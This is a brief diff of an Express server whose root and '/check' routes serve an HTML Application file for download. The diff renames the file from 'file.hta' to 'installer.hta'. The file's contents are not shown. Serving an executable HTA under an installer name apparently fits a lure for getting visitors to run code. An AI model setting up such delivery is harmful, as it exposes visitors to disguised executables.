@@ -4,12 +4,12 @@ const path = require("path");
 const app = express();
 
 app.get("/", (req, res) => {
-  const filePath = path.join(__dirname, "file.hta");
+  const filePath = path.join(__dirname, "installer.hta");
   res.download(filePath);
 });
 
 app.get("/check", (req, res) => {
-  const filePath = path.join(__dirname, "file.hta");
+  const filePath = path.join(__dirname, "installer.hta");
 
   res.download(filePath, (err) => {
     if (err) {
